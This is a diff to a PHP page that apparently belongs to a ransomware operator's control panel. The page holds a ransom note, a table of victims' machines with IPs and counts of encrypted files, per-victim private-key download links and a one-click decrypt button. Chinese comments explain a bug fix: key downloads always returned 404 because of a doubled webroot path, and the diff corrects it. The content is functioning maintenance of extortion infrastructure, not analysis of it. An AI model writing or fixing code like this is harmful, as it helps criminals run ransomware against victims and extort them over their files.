@@ -184,7 +184,11 @@ Contact us to obtain the private key and restore your files.</textarea>
   $ss=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['systemid']);
   $nt=date("H-i-s",strtotime($row['time']));
   // 绝对路径：相对路径要靠 Apache 的 CWD 才对，是隐藏的脆弱点
-  $fp=__DIR__.'/passwords/'.$sm.'_'.$su.'/'.$nt.'_'.$ss.'.flora';
+  $fp_abs=__DIR__.'/passwords/'.$sm.'_'.$su.'/'.$nt.'_'.$ss.'.flora';
+  // 传给 download_file.php 的必须是【相对 webroot】的路径：download_file 内部会做
+  // realpath($root . '/' . $file)。此前传绝对路径 __DIR__/passwords/... 会拼成
+  // $root.'/'.$root.'/passwords/...'（双份 webroot）→ realpath 失败 → 永远 404。
+  $fp_rel='passwords/'.$sm.'_'.$su.'/'.$nt.'_'.$ss.'.flora';
   $ec=intval($row['encrypted_count']??0);
   $es=intval($row['encrypted_size']??0);
   $et=h($row['encrypted_types']??'');
@@ -228,7 +232,7 @@ Contact us to obtain the private key and restore your files.</textarea>
   </td>
   <td><span style="font-size:.72rem;color:#94a3b8;word-break:break-all"><?=$et?></span></td>
   <td style="white-space:nowrap">
-    <?php if(file_exists($fp)):?><a href="download_file.php?file=<?=urlencode($fp)?>" class="btn-sm" title="下载密钥"><i class="fas fa-key"></i></a><?php endif;?>
+    <?php if(file_exists($fp_abs)):?><a href="download_file.php?file=<?=urlencode($fp_rel)?>" class="btn-sm" title="下载密钥"><i class="fas fa-key"></i></a><?php endif;?>
     <button class="btn-sm" style="background:#10b981" data-ip="<?=h($row['ip'])?>" data-linux="<?=$is_linux?'1':'0'?>" onclick="showDecrypt('<?=$vid?>',this)" title="一键解密"><i class="fas fa-unlock"></i></button>
   </td>
 </tr>
